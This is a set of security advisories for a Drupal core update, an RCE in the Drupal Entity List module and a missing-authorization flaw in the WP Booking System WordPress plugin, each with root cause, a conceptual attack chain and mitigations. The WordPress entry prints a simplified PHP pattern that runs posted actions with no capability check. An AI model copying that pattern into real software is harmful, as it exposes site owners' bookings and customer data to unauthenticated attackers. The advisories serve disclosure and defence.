docs.text:
• Update Drupal core: 10.6.x to 10.6.19, 11.3.x to 11.3.19, 11.4.x to 11.4.10.
  • Temporary stopgap: uninstall the field_ui module — blocks this hole cold.
  • Drupal Steward blocks some known vectors but not all — still patch.
  • Hunt for compromise: shells or script interpreters spawned by PHP/web-server processes, unknown files in the web root, unexpected outbound traffic.

docs.title: CVE-2026-108099 — Remote Code Execution in Drupal Entity List Module
docs.text: Field Detail Severity Critical (Drupal 19/25) Product Entity List (contributed module — builds entity lists without Views) Type Remote Code Execution Attack vector Unauthenticated — via interaction with other contributed modules or custom code CVE CVE-2026-108099 Advisory SA-CONTRIB-2026-218 (2026-10-14)

docs.title: Affected versions
docs.text: • Entity List < 3.0.10

docs.title: Root cause
docs.text: Entity List carries a remote code execution flaw in how it builds entity lists. Like its core counterpart (CVE-2026-108097), it is not directly exploitable through the module alone — but combined with other contributed modules or custom code, the vulnerable functionality becomes reachable from remote input, including at least one confirmed path that requires no authentication. The specific module combinations were not disclosed, so any site running Entity List < 3.0.10 alongside custom or contributed code should assume exposure.

docs.title: Proof of concept
docs.text:
Educational illustration of the bug class only. No working exploit is provided. Test only in controlled environments against systems you own.

Conceptual attack chain:

  1. The attacker (no login) reaches a page where Entity List rendering is combined with another module's input handling.
  2. Crafted input reaches the vulnerable list-building logic.
  3. Arbitrary PHP executes as the web-server user — web shell, credential theft, or full takeover follow.

The underlying pattern is the same family as CVE-2026-108097: untrusted input reaching a code-execution sink. See poc.py for a safe, local illustration of validated vs. unvalidated dispatch.

docs.title: Mitigation
docs.text:
• Update Entity List to 3.0.10.
  • Note: uninstalling Field UI does not fix this one — update the module itself.
  • Drupal Steward coverage for this CVE is not confirmed — patch, don't rely on it.
  • Audit custom code and contributed modules for paths that hand external input to list rendering.

docs.title: CVE-2026-108123 — WP Booking System: Missing Authorization on Booking Actions
docs.text: Field Value Severity High — CVSS 7.5 Product WordPress plugin wp-booking-system (WP Booking System – Booking Calendar) Type Missing Authorization (CWE-862) Vector Unauthenticated, network → privileged booking actions and customer data

docs.title: Affected versions
docs.text: WP Booking System versions up to and including 2.1.0.3. Fixed in the release after 2.1.0.3.

docs.title: Root cause
docs.text:
The plugin does not properly verify that the requester is authorized to perform booking actions. The code path that handles privileged operations — the same calls the admin dashboard makes — is missing the capability check (current_user_can()), so the action executes for anyone who calls the endpoint directly, including unauthenticated visitors.

// Simplified vulnerable pattern
function handle_booking_action() {
    do_action($_POST['action']);   // no current_user_can() gate
}

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker — no login required — calls the plugin's booking action endpoints directly, replaying the same requests the admin dashboard sends.
  2. With no authorization check in the way, privileged operations execute: listing, modifying, or deleting bookings, and reading customer data that should be admin-only.
  3. The appointment book becomes an open ledger for anyone who knows the endpoint.

The accompanying poc.py demonstrates the pattern safely: a mock action handler that runs privileged operations without a capability check versus a fixed one with an explicit gate. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update WP Booking System past 2.1.0.3 immediately.
  • Review recent booking changes for tampering or unexpected access.
  • Audit who accessed customer data via the plugin's endpoints.
  • Restrict the plugin's action endpoints to authenticated, authorized users.
